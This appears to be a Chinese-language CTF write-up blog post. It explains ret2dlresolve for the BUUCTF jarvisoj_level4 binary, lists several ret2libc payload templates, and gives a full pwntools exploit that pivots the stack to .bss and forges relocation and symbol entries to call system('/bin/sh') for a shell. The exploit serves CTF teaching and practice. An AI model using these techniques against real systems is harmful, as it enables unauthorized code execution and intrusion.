+++
title = "2-3-2"
date = "2026-04-16"
type = "post"
categories = ['BUU']
tags = ['BUU']
draft = false
+++
这题的做法应当不只一种
本来其实可以尝试ret2libc的。他有read和write可惜可以溢出的长度不太够，构造不了ret2libc。ret2libc需要的字节数一般都是几十个，比如：
```python
64位write：payload = b'A' * offset + p64(ret_addr) + p64(pop_rdi) + p64(1) +p64(pop_rsi) + p64(got) + p64(4) + p64(plt) + p64(main_addr) #栈溢出后64个字节
64位puts：payload = b'A' * offset + p64(pop_rdi) +p64(puts_got) + p64(puts_plt) + p64(main_addr) #栈溢出后24个
32位puts：payload = b'A' * offset+ p32(puts_plt) + p32(main) + p32(puts_got) #12个
32位write：p2 = cyclic(0x88 + 4) + flat([write_plt, main, 1, write_got, 4]) #20个
```
这题只给到了0x12，write，显然是不够的。于是涉及到了新的一类题型：`ret2dlresolve`，对应函数`dl_runtime_resolve`。关于这个函数可以看下面的几个笔记：
 - DynELF-1
 - _dl_runtime_resolve如何找到函数
 - ret2dlresolve
简单的来说就是篡改got.plt或者什么的让原本的指令运行另外的指令，有一种改映射表的感觉。这个做法的前提是没有开`Full RELRO`，got表可写。
`dl_runtime_resolve`方法的总体流程大概是，调用一个函数的时候，程序入口为`plt0`,紧跟着`plt0`是一个偏移，指向重定向表的。重定向表有两个值，第一个为函数的`got`地址，第二个也是一个偏移，这个偏移指向`sym表`。最后根据`sym表`的第一个偏移找到`str表`，然后`str表`就会去找这个字符串对应的函数，最后就去`libc库`找对应的地址。
Pasted image 20260416101817.png

老老实实按给出的脚本去找东西，这类题也是贴模板
然后那个strtab就是.dynstr 
```python
from pwn import *  
elf = ELF('./level4')  
context.terminal = ['tmux', 'splitw', '-h']  
context(log_level='debug', arch='i386', os='linux')  
select = 1  
if select == 0:  
    r = process( './pwn' )  
    #libc = ELF(local_libc)  
else:  
    r = remote('node5.buuoj.cn', 28980)  
    #libc = ELF(remote_libc)  
#elf = ELF(local_file)  
  
def dbg():  
    gdb.attach(p)  
    pause()  
  
  
offset = 0x88 + 4  
read_plt = elf.plt['read']  
write_plt = elf.plt['write']  
  
ppp_ret = 0x08048509 # ROPgadget --binary level4 --only "pop|ret"  
pop_ebp_ret = 0x0804850b  
leave_ret = 0x080483b8 # ROPgadget --binary level4 --only "leave|ret"  
  
stack_size = 0x800  #chose one,equals creating an stack  
bss_addr = 0x0804a024 # readelf -S level4 | grep ".bss"  
base_stage = bss_addr + stack_size  
  
#r = process('./level4')  
  
#r.recvuntil(b'Hello, World!\n')  
# 把payload2写入bss段，并把栈迁移到bss段  
payload = flat('A' * offset, p32(read_plt), p32(ppp_ret), p32(0), p32(base_stage), p32(100), p32(pop_ebp_ret), p32(base_stage), p32(leave_ret))  
r.sendline(payload)  
  
cmd = b"/bin/sh\x00"  
plt_0 = 0x08048300 # objdump -d -j .plt level4  
rel_plt = 0x80482b0 # objdump -s -j .rel.plt level4  
dynsym = 0x080481cc  # readelf -S level4  
strtab = 0x0804822C #readelf -S level4  
fake_write_addr = base_stage + 28  
fake_arg = fake_write_addr - rel_plt  
r_offset = elf.got['write']  
  
align = 0x10 - ((base_stage + 36 - dynsym) % 16)  
fake_sym_addr = base_stage + 36 + align # 填充地址使其与dynsym的偏移16字节对齐（即两者的差值能被16整除），因为结构体sym的大小都是16字节  
r_info = ((((fake_sym_addr - dynsym)//16) << 8) | 0x7) # 使其最低位为7，通过检测  
fake_write_rel = flat(p32(r_offset), p32(r_info))  
fake_write_str_addr = base_stage + 36 + align + 0x10  
fake_name = fake_write_str_addr - strtab  
fake_sym = flat(p32(fake_name),p32(0),p32(0),p32(0x12))  
fake_write_str = b'system\x00'  
  
payload2 = flat(b'AAAA'  
, p32(plt_0)  
, fake_arg  
, p32(ppp_ret)  
, p32(base_stage + 80)  
, p32(base_stage + 80)  
, p32(len(cmd))  
, fake_write_rel # base_stage + 28  
, b'A' * align # 用于对齐的填充  
, fake_sym # base_stage + 36 + align  
, fake_write_str # 伪造出的字符串  
)  
payload2 += flat(b'A' * (80-len(payload2)) , cmd)  
payload2 += flat(b'A' * (100-len(payload2)))  
  
r.sendline(payload2)  
r.interactive()
```











---
参考文章：
 - [jarvisoj_level4--buuctf](https://blog.csdn.net/2301_81060697/article/details/147403311)
 - [一种比较麻烦的Rop链构造——ret2dlresolve](https://blog.csdn.net/dydxdz/article/details/79868351?ops_request_misc=&request_id=&biz_id=102&utm_term=ret2libc%E9%99%90%E5%88%B6&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-79868351.142^v102^pc_search_result_base6&spm=1018.2226.3001.4187)
